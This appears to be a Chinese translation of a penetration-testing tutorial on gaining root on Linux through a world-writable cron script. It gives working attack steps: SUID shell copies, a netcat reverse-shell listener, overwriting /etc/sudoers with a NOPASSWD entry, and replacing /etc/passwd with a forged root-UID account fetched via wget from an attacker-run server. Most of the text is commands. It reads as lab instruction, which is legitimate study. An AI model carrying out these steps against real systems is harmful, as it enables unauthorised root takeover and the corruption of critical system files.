**在Linux中，一切都可以看做文件，包括所有允许/禁止读写执行权限的目录和设备。当管理员为任何文件设置权限时，都应清楚并合理为每个Linux用户分配应有的读写执行权限。在本文中我将为大家展示，如何利用Linux中具有写入权限的文件/脚本来进行提权操作。想要了解更多关于Linux系统权限的内容，可以阅读[这篇文章](http://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)。好了，话不多说。下面就进入我们的正题吧！**

首先，我们来启动我们的攻击机并渗透进目标系统直至提权阶段。这里假设我通过ssh成功登录到了受害者机器，并访问了非root用户的终端。通过以下命令，我们可以枚举所有具有可写权限的二进制文件。

    
    
    find / -writable -type  f 2>/dev/null | grep -v "/proc/"

可以看到在/lib/log路径下有一个python文件，我们进入到该目录并查看该文件的权限为777

![1.png](https://image.3001.net/images/20180611/1528708087298.png!small)

通过cat命令查看该文件内容，这是管理员添加的一个用来清除
/tmp中的所有垃圾文件的脚本，具体执行取决于管理员设置的定时间隔。获取了这些信息后，攻击者可以通过以下方式来执行提权操作。

![2.png](https://image.3001.net/images/20180611/15287081064450.png!small)

## 方法1

我们复制了/bin/sh到/tmp下并为/tmp/sh启用了SUID。使用编辑器打开sanitizer.py并将 **“rm -r /tmp/*”**
中的内容替换为以下两行：

    
    
    os.system('cp /bin/sh /tmp/sh')
    os.system('chmod u+s /tmp/sh')

![3.png](https://image.3001.net/images/20180611/15287081212302.png!small)

一段时间后，它将在/tmp目录内创建一个具有SUID权限的sh文件，当你运行它时，你将会获取root访问权限。

    
    
    cd /tmp
    ls
    ./sh
    id
    whoami

下图可以说明一切！

## ![4.png](https://image.3001.net/images/20180611/1528708141862.png!small)

## 方法2

同样，你也可以将 **“rm -r /tmp/*”** 替换为以下内容：

    
    
    os.system(‘chmod u+s /bin/dash)

![5.png](https://image.3001.net/images/20180611/15287081588875.png!small)

一段时间后，它将为/bin/dash设置SUID权限，并且在运行时会给予root访问权限。

    
    
    /bin/dash
    id
    whoami

如下图所示：

## ![6.png](https://image.3001.net/images/20180611/15287081774191.png!small)

## 方法3

在这种方法中，我们在 **rm -r /tmp/*** 的位置粘贴了python反向shell连接代码，并在新的终端中启动了netcat侦听。

![7.png](https://image.3001.net/images/20180611/15287082011460.png!small)

如上所述，经过一段时间后，我们通过netcat获取了具有root访问权限的反向shell。

    
    
    nc -lvp 1234
    id
    whoami

如下图所示：

![8.png](https://image.3001.net/images/20180611/15287082186909.png!small)

## 方法4

这个方法挺有意思的，在下图中大家可以看到我当前的用户是没有执行sudo命令的权限的。那我们就想办法让自己成为suoders文件成员。

![9.png](https://image.3001.net/images/20180611/15287082376276.png!small)

同样，我们将 **“rm -r /tmp/*”** 替换为以下内容：

    
    
    os.system('echo "wernerbrandes ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers')

![10.png](https://image.3001.net/images/20180611/15287082637196.png!small)

过一段时间后，当你输入“sudo -l”命令时，你会注意到，它已成为了sudo用户的成员。此时我们只要输入“sudo bash”就可以获取root访问权限。

    
    
    sudo -l
    sudo bash
    id

## 方法5

我们知道passwd在任何类linux的系统中都扮演着非常重要的角色，一旦攻击者有机会可以修改此文件，那么它将会成为一种特权提升的动态方式。

同样，我们也不会忽视这一点，使用cat命令读取etc/passwd文件。

在这里你可以观察到用户名为nemo记录的高亮条目，根据我的猜测UID:1000 & GID:1000表示它应该是管理员组的成员。

但我们的目标是通过编辑nemo记录，使其成为root组的成员。因此，我们选择并复制etc/passwd文件内的所有记录，然后将它粘贴到一个空的文本文件中。

![11.png](https://image.3001.net/images/20180611/15287082884051.png!small)

然后在一个新的终端中使用openssl生成一个加盐密码并复制。

    
    
    openssl passwd -1 -salt abc 123

![12.png](https://image.3001.net/images/20180611/15287083088571.png!small)

现在将上面复制的加盐密码粘贴至用户nemo记录条目中的“X”处，并且将UID&GID更改为0，如图所示。操作完成后，将文本文件保存为“passwd”，将该文件传输至目标系统，它将覆盖原始passwd文件的内容。

    
    
    cd Desktop
    python -m SimpleHTTPServer 80

![13.png](https://image.3001.net/images/20180611/15287083338118.png!small)

同样，将 **“rm -r /tmp/*”** 替换为以下内容：

    
    
    os.system(‘chmod u+s /bin/cp)

一段时间后，它会启用/bin/cp的SUID位以复制任意文件。

![14.png](https://image.3001.net/images/20180611/15287083579308.png!small)

现在将被你修改过的passwd文件下载至目标系统的/tmp目录中。让我们来检查一下/bin/cp是否启用了SUID位，然后使用cp命令将修改的passwd文件复制到/etc/passwd中，这将覆盖原始passwd文件的内容。

    
    
    cd /tmp
    wget http://192.168.1.103/passwd
    ls -al /bin/cp
    cp passwd /etc/passwd

![15.png](https://image.3001.net/images/20180611/1528708378393.png!small)

现在，我们键入以下命令查看修改内容是否已在passwd文件中生效。

    
    
    tail /etc/passwd

可以看到修改内容已成功写入！

![16.png](https://image.3001.net/images/20180611/15287083999971.png!small)

执行以下命令获取root访问权限：

    
    
    su nemo
    password 123
    whoami

![17.png](https://image.3001.net/images/20180611/15287084173069.png!small)

 ***参考来源：[hackingarticles](http://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**

